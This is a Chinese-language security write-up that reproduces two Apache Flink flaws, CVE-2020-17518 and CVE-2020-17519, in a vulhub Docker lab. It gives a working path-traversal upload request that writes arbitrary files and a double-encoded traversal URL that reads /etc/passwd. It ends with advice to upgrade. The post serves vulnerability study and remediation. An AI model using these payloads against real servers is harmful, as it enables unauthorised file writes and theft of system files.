# **0x00简介**

Apache Flink是近几年大火的数据处理引擎。受到各大厂商的推崇并且已经应用与实际的业务场景中。很多公司在进行选型的时候都会选择Apache
Flink作为选型的对象。Flink核心是一个流式的数据流执行引擎，其针对数据流的分布式计算提供了数据分布、数据通信以及容错机制等功能。基于流执行引擎，Flink提供了诸多更高抽象层的API以便用户编写分布式任务。

#  **0x01漏洞概述**

 **CVE-2020-17519**

Apache Flink
1.11.0中引入的一个更改(也在1.11.1和1.11.2中发布)允许攻击者通过JobManager进程的REST接口读取JobManager本地文件系统上的任何文件。

 **CVE-2020-17518**

Apache Flink 1.5.1引入了一个REST处理程序，允许您通过恶意修改的HTTP头将上传的文件写入到本地文件系统上的任意位置。

#  **0x02影响范围**

 **CVE-2020-17519**

1.11.0

1.11.1

1.11.2

 **CVE-2020-17518**

Flink 1.5.1-1.11.2

#  **0x03环境搭建**

1.本次漏洞环境使用vulhub的docker环境搭建，vulhub下载地址：

https://github.com/vulhub/vulhub/

2.下载完成后传入装有docker和docker-compose环境的虚拟机，进入目录

cd vulhub-master/flink/CVE-2020-17519/

![1611195327_6008e3bf29e77e27dde4b.jpg!small](https://image.3001.net/images/20210121/1611195327_6008e3bf29e77e27dde4b.jpg!small)

3.使用docker-compose up -d
拉取漏洞环境，因17519的漏洞环境版本是1.11.2所以复现两个漏洞只需要一个漏洞环境即可。出现”done”表示拉取成功

![1611195329_6008e3c1e9888c95e669e.jpg!small](https://image.3001.net/images/20210121/1611195329_6008e3c1e9888c95e669e.jpg!small)

4.在浏览器输入http://your-ip:8081查看页面

![1611195337_6008e3c9a6ff591b2a471.jpg!small](https://image.3001.net/images/20210121/1611195337_6008e3c9a6ff591b2a471.jpg!small)

#  **0x04漏洞复现**

 **CVE-2020-17518复现**

1、首先我们先使用CVE-2020-17518漏洞写入文件，在首页抓包构造以下构建数据包进行发送

POST /jars/upload HTTP/1.1

Host: your-ip:8081

Accept-Encoding: gzip, deflate

Accept: */*

Accept-Language: en

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36

Connection: close

Content-Type: multipart/form-data; boundary=--------721072898

Content-Length: 149

\----------721072898

Content-Disposition: form-data; name="jarfile";
filename="../../../../../../../../tmp/success"

success

\----------721072898--
![1611195343_6008e3cfb9752bf174bc3.jpg!small](https://image.3001.net/images/20210121/1611195343_6008e3cfb9752bf174bc3.jpg!small)

![1611195347_6008e3d3903ea73b3e5ef.jpg!small](https://image.3001.net/images/20210121/1611195347_6008e3d3903ea73b3e5ef.jpg!small)

2.上面数据包返回的虽然是400但是已经写入到docker中，进去docker查看

![1611195352_6008e3d8ee545b41d3bae.jpg!small](https://image.3001.net/images/20210121/1611195352_6008e3d8ee545b41d3bae.jpg!small)

 **CVE-2020-17519复现**

1.上面写入后要是不能进入docker查看这里可以利用CVE-2020-17519漏洞进行文件读取，在页面首页输入以下payload查看tmp目录下的文件

http://172.16.1.147:8081/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252ftmp%252fsuccess

![1611195357_6008e3ddecae4fbeb9cf3.jpg!small](https://image.3001.net/images/20210121/1611195357_6008e3ddecae4fbeb9cf3.jpg!small)

2.修改后面的payload改为查看etc下的passwd文件

![1611195360_6008e3e0c361c2032b301.jpg!small](https://image.3001.net/images/20210121/1611195360_6008e3e0c361c2032b301.jpg!small)

#  **0x05修复建议**

建议升级到安全版本或最新版本。

